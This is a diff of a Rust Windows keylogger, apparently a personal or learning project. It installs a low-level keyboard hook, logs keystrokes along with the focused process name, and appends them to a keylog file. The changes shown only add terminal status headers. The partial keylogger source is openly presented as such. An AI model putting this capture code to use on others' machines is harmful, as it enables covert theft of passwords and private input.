@@ -1,8 +1,10 @@
 use once_cell::sync::Lazy;
 use std::fs::OpenOptions;
-use std::io::{self, Write};
+use std::io::{self, Write, stdout};
 use std::ptr;
 use std::sync::Mutex;
+use crossterm::cursor::{position, MoveTo};
+use crossterm::ExecutableCommand;
 use windows_sys::Win32::Foundation::*;
 use windows_sys::Win32::System::Console::{FlushConsoleInputBuffer, GetStdHandle, STD_INPUT_HANDLE};
 use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
@@ -10,6 +12,8 @@ use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetAsyncKeyState, GetKeybo
 use windows_sys::Win32::UI::WindowsAndMessaging::*;
 use windows_sys::Win32::UI::Input::KeyboardAndMouse::{VK_SHIFT, VK_CAPITAL};
 use crate::process_identification::{display_focused_process_name, reset_first_call_flag};
+use crate::formatting::{clear_current_line, initialize_header, update_status_header};
+
 
 // Static means that it lasts the entire duration of the program.
 static KEY_BUFFER: Lazy<Mutex<Vec<u16>>> = Lazy::new(|| Mutex::new(Vec::new()));
@@ -25,10 +29,11 @@ pub unsafe extern "system" fn keyboard_procedure(
         if n_code == HC_ACTION as i32 {
             if w_param == WM_KEYDOWN as usize ||
                 w_param == WM_SYSKEYDOWN as usize {
+                update_status_header("🧏 Listening").unwrap();
                 if (*(l_param as *const KBDLLHOOKSTRUCT)).vkCode as u16 == VK_ESCAPE {
                     process_escape_key();
                     reset_first_call_flag();
-                    io::stdout().flush().unwrap()
+                    stdout().flush().unwrap()
                 } else {
                     display_focused_process_name();
                     process_keyboard_input(l_param);
@@ -100,8 +105,6 @@ unsafe fn process_keyboard_input(l_param: LPARAM) {
 }
 
 fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
-    
-    println!("\nDumping buffer to keylog file.");
     let mut file = OpenOptions::new()
         .create(true)
         .append(true)
@@ -110,7 +113,12 @@ fn log_keyboard_input(cloned_buffer: &Vec<u16>) {
 
     if let Ok(s) = String::from_utf16(cloned_buffer) {
         file.write_all(s.as_bytes()).unwrap();
-        println!("Buffer successfully dumped to keylog file.");
+        clear_current_line().unwrap();
+        if let Ok((_, row)) = position() {
+            stdout().execute(MoveTo(0, row)).unwrap();
+        }
+        update_status_header("💾 Saved Buffer").unwrap();
+        stdout().flush().unwrap();
     } else {
         eprintln!("Failed to convert buffer to string.");
     }
@@ -131,8 +139,9 @@ pub fn run_keylogger() {
             return;
         }
 
-        println!("Keyboard hook installed. Press keys to see output. Press Ctrl+C to exit.");
-        println!("Press ESCAPE to uninstall hook.");
+        initialize_header().unwrap_or_else(|e| {
+            eprintln!("Failed to initialize header: {}", e);
+        });
 
         let mut msg = std::mem::zeroed::<MSG>(); // Zero MSG struct to receive new message information
         // It is critical to not mess with this code as it could cause critical errors
